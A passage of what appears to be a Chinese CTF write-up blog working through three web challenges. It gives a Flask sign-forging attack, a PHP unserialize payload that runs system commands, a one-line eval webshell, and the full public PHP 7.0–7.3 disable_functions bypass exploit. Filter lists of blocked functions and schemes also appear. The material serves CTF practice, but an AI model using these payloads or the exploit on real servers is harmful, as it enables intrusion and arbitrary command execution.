&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sign Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; result
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkSign&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (getSign(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action, self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# generate Sign For Action Scan.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/geneSign&amp;#34;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;geneSign&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; getSign(action, param)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/De1ta&amp;#39;&lt;/span&gt;, methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;challenge&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;action&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;param&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;unquote(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;cookies&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#34;sign&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ip &lt;span style="color:#f92672"&gt;=&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;remote_addr
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (waf(param)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;No Hacker!!!!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; task &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Task(action, param, sign, ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; json&lt;span style="color:#f92672"&gt;.&lt;/span&gt;dumps(task&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Exec())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;code.txt&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;scan&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; socket&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaulttimeout(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; urllib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urlopen(param)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()[:&lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;getSign&lt;/span&gt;(action, param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(secert_key &lt;span style="color:#f92672"&gt;+&lt;/span&gt; param &lt;span style="color:#f92672"&gt;+&lt;/span&gt; action)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(content):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; hashlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;md5(content)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;hexdigest()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;waf&lt;/span&gt;(param):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; check &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param&lt;span style="color:#f92672"&gt;.&lt;/span&gt;strip()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;lower()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;gopher&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;or&lt;/span&gt; check&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;debug &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;run(host&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单说明思路：&lt;/p&gt;
&lt;p&gt;请求部分(代码69-78)：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;读取文件需要在cookie里传入参数action、sign&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;action是执行类型，代码33行和43行指出了两种。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sing是用来验证param和action的，相关函数在94行，稍后做解释&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;获取sign部分(61-66)&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;获取param，action固定为scan&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;返回(secert_key + param + action)组合的sign&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。&lt;/p&gt;
&lt;p&gt;假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用&lt;code&gt;|&lt;/code&gt;仅为说明使用，其实字符串是相连的)&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是我们想要使用read，可以构造param为flag.txtread&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txtread|scan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;secert_key|flag.txt|readscan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;请求/geneSign&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/geneSign?param=flag.txtread
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;9017a8826b7267833f22c0f22d90fea7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到sign以后，再去访问/De1ta&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/De1ta?param=flag.txt
sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2020-朱雀组phpweb"&gt;[网鼎杯 2020 朱雀组]phpweb
&lt;/h1&gt;&lt;p&gt;看源码，有一个表单和自动提交的js。表单参数为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=date&amp;amp;p=Y-m-d+h%3Ai%3As+a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$disable_fun = array(&amp;#34;exec&amp;#34;,&amp;#34;shell_exec&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;passthru&amp;#34;,&amp;#34;proc_open&amp;#34;,&amp;#34;show_source&amp;#34;,&amp;#34;phpinfo&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;dl&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;proc_terminate&amp;#34;,&amp;#34;touch&amp;#34;,&amp;#34;escapeshellcmd&amp;#34;,&amp;#34;escapeshellarg&amp;#34;,&amp;#34;assert&amp;#34;,&amp;#34;substr_replace&amp;#34;,&amp;#34;call_user_func_array&amp;#34;,&amp;#34;call_user_func&amp;#34;,&amp;#34;array_filter&amp;#34;, &amp;#34;array_walk&amp;#34;, &amp;#34;array_map&amp;#34;,&amp;#34;registregister_shutdown_function&amp;#34;,&amp;#34;register_tick_function&amp;#34;,&amp;#34;filter_var&amp;#34;, &amp;#34;filter_var_array&amp;#34;, &amp;#34;uasort&amp;#34;, &amp;#34;uksort&amp;#34;, &amp;#34;array_reduce&amp;#34;,&amp;#34;array_walk&amp;#34;, &amp;#34;array_walk_recursive&amp;#34;,&amp;#34;pcntl_exec&amp;#34;,&amp;#34;fopen&amp;#34;,&amp;#34;fwrite&amp;#34;,&amp;#34;file_put_contents&amp;#34;);
function gettime($func, $p) {
$result = call_user_func($func, $p);
$a= gettype($result);
if ($a == &amp;#34;string&amp;#34;) {
return $result;
} else {return &amp;#34;&amp;#34;;}
}
class Test {
var $p = &amp;#34;Y-m-d h:i:s a&amp;#34;;
var $func = &amp;#34;date&amp;#34;;
function __destruct() {
if ($this-&amp;gt;func != &amp;#34;&amp;#34;) {
echo gettime($this-&amp;gt;func, $this-&amp;gt;p);
}
}
}
$func = $_REQUEST[&amp;#34;func&amp;#34;];
$p = $_REQUEST[&amp;#34;p&amp;#34;];
if ($func != null) {
$func = strtolower($func);
if (!in_array($func,$disable_fun)) {
echo gettime($func, $p);
}else {
die(&amp;#34;Hacker...&amp;#34;);
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。&lt;/p&gt;
&lt;p&gt;先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Test {
var $p = &amp;#34;ls ../../../../&amp;#34;;
var $func = &amp;#34;system&amp;#34;;
}
$s=new Test();
echo urlencode(serialize($s));
#unserialize
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
func=unserialize&amp;amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后读文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=readfile&amp;amp;p=../../../../tmp/flagoefiu4r93
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gkctf2020checkin"&gt;[GKCTF2020]CheckIN
&lt;/h1&gt;&lt;p&gt;是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;phpinfo();
cGhwaW5mbygpOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数&lt;/p&gt;
&lt;p&gt;可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。&lt;/p&gt;
&lt;p&gt;scandir根目录查看&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件&lt;/p&gt;
&lt;p&gt;传码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eval($_POST[1]);
ZXZhbCgkX1BPU1RbMV0pOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;RCE ME&lt;/a&gt;也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1
pwn(&amp;#34;../../.././readflag&amp;#34;); #这里是想要执行的命令
function pwn($cmd) {
global $abc, $helper;
function str2ptr(&amp;amp;$str, $p = 0, $s = 8) {
$address = 0;
for($j = $s-1; $j &amp;gt;= 0; $j--) {
$address &amp;lt;&amp;lt;= 8;
$address |= ord($str[$p+$j]);
}
return $address;
}
function ptr2str($ptr, $m = 8) {
$out = &amp;#34;&amp;#34;;
for ($i=0; $i &amp;lt; $m; $i++) {
$out .= chr($ptr &amp;amp; 0xff);
$ptr &amp;gt;&amp;gt;= 8;
}
return $out;
}
function write(&amp;amp;$str, $p, $v, $n = 8) {
$i = 0;
for($i = 0; $i &amp;lt; $n; $i++) {
$str[$p + $i] = chr($v &amp;amp; 0xff);
$v &amp;gt;&amp;gt;= 8;
}
}
function leak($addr, $p = 0, $s = 8) {
global $abc, $helper;
write($abc, 0x68, $addr + $p - 0x10);
$leak = strlen($helper-&amp;gt;a);
if($s != 8) { $leak %= 2 &amp;lt;&amp;lt; ($s * 8) - 1; }
return $leak;
}
function parse_elf($base) {
$e_type = leak($base, 0x10, 2);
$e_phoff = leak($base, 0x20);
$e_phentsize = leak($base, 0x36, 2);
$e_phnum = leak($base, 0x38, 2);
for($i = 0; $i &amp;lt; $e_phnum; $i++) {
$header = $base + $e_phoff + $i * $e_phentsize;
$p_type = leak($header, 0, 4);
$p_flags = leak($header, 4, 4);
$p_vaddr = leak($header, 0x10);
$p_memsz = leak($header, 0x28);
if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
# handle pie
$data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
$data_size = $p_memsz;
} else if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
$text_size = $p_memsz;
}
}
if(!$data_addr || !$text_size || !$data_size)
return false;
return [$data_addr, $text_size, $data_size];
}
function get_basic_funcs($base, $elf) {
list($data_addr, $text_size, $data_size) = $elf;
for($i = 0; $i &amp;lt; $data_size / 8; $i++) {
$leak = leak($data_addr, $i * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;constant&amp;#39; constant check
if($deref != 0x746e6174736e6f63)
continue;
} else continue;
$leak = leak($data_addr, ($i + 4) * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;bin2hex&amp;#39; constant check
if($deref != 0x786568326e6962)
continue;
} else continue;
return $data_addr + $i * 8;
}
}
function get_binary_base($binary_leak) {
$base = 0;
$start = $binary_leak &amp;amp; 0xfffffffffffff000;
for($i = 0; $i &amp;lt; 0x1000; $i++) {
$addr = $start - 0x1000 * $i;
$leak = leak($addr, 0, 7);
if($leak == 0x10102464c457f) { # ELF header
return $addr;
}
}
}
function get_system($basic_funcs) {
$addr = $basic_funcs;
do {
$f_entry = leak($addr);
$f_name = leak($f_entry, 0, 6);
if($f_name == 0x6d6574737973) { # system
return leak($addr + 8);
}
$addr += 0x20;
} while($f_entry != 0);
return false;
}
class ryat {
var $ryat;
var $chtg;
function __destruct()
{
$this-&amp;gt;chtg = $this-&amp;gt;ryat;
$this-&amp;gt;ryat = 1;
}
}
class Helper {
public $a, $b, $c, $d;
}
if(stristr(PHP_OS, &amp;#39;WIN&amp;#39;)) {
die(&amp;#39;This PoC is for *nix systems only.&amp;#39;);
}
$n_alloc = 10; # increase this value if you get segfaults
$contiguous = [];
for($i = 0; $i &amp;lt; $n_alloc; $i++)
$contiguous[] = str_repeat(&amp;#39;A&amp;#39;, 79);
$poc = &amp;#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&amp;#34;ryat&amp;#34;:2:{s:4:&amp;#34;ryat&amp;#34;;R:3;s:4:&amp;#34;chtg&amp;#34;;i:2;}}i:1;i:3;i:2;R:5;}&amp;#39;;
$out = unserialize($poc);
gc_collect_cycles();
$v = [];
$v[0] = ptr2str(0, 79);
unset($v);
$abc = $out[2][0];
$helper = new Helper;
$helper-&amp;gt;b = function ($x) { };
if(strlen($abc) == 79 || strlen($abc) == 0) {
die(&amp;#34;UAF failed&amp;#34;);
}
# leaks
$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;
# fake value
write($abc, 0x60, 2);
write($abc, 0x70, 6);
# fake reference
write($abc, 0x10, $abc_addr + 0x60);
write($abc, 0x18, 0xa);
$closure_obj = str2ptr($abc, 0x20);
$binary_leak = leak($closure_handlers, 8);
if(!($base = get_binary_base($binary_leak))) {
die(&amp;#34;Couldn&amp;#39;t determine binary base address&amp;#34;);
}
if(!($elf = parse_elf($base))) {
die(&amp;#34;Couldn&amp;#39;t parse ELF header&amp;#34;);
}
if(!($basic_funcs = get_basic_funcs($base, $elf))) {
die(&amp;#34;Couldn&amp;#39;t get basic_functions address&amp;#34;);
}
if(!($zif_system = get_system($basic_funcs))) {
die(&amp;#34;Couldn&amp;#39;t get zif_system address&amp;#34;);
}
# fake closure object
$fake_obj_offset = 0xd0;
for($i = 0; $i &amp;lt; 0x110; $i += 8) {
write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
}
# pwn
write($abc, 0x20, $abc_addr + $fake_obj_offset);
write($abc, 0xd0 + 0x38, 1, 4); # internal func type
write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
($helper-&amp;gt;b)($cmd);
exit();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="0302"&gt;03.02
